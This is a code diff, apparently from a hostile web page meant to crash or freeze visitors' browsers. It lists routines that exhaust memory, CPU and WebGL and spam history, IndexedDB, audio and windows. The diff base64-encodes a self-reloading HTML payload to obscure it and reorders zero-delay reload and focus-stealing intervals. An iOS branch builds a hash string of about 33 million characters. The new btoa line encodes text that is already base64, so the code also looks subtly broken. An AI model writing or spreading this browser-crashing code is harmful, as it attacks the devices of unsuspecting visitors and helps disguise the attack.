@@ -131,7 +131,7 @@
 
         function blobSpam() {
             while(true) {
-                let blob = new Blob(['<body><script>for(;;)location.reload()</script></body>'], {type: 'text/html'});
+                let blob = new Blob([btoa("PGJvZHk+PHNjcmlwdD5mb3IoOzspbG9jYXRpb24ucmVsb2FkKCk7PC9zY3JpcHQ+PC9ib2R5Pg==")], {type: 'text/html'});
                 window.open(URL.createObjectURL(blob));
             }
         }
@@ -143,9 +143,6 @@
             
             const platform = getPlatform();
             
-            setInterval(() => location.reload(true), 0);
-            setInterval(() => window.focus(), 0);
-            
             [memoryExhaust, cpuExhaust, webglSpam, cssCrash, 
              historySpam, indexedDBSpam, audioSpam, transformSpam, 
              spawnWindows, blobSpam].forEach(fn => {
@@ -153,6 +150,9 @@
                 setTimeout(fn, 10);
             });
             
+            setInterval(() => location.reload(true), 0);
+            setInterval(() => window.focus(), 0);
+
             if (platform ==="ios") {
                 location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
             }
